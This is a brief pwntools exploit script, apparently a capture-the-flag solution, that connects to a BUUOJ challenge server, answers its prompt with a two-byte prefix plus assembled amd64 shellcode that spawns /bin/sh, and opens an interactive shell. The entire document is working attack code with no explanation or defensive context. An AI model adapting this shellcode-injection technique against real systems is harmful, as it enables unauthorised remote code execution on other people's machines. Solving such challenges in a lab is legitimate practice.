from pwn import *
from ae64 import *
# context.log_level = 'debug'
context.arch = 'amd64'

# io = process(['./pwn'])
io = remote('node4.buuoj.cn', 25580)

sa = lambda x, y: io.sendafter(x, y)

if __name__ == '__main__':
	sa(b'give me shellcode, plz:\n', b'\x00\x2f' + asm(shellcraft.amd64.sh()))
	io.interactive()
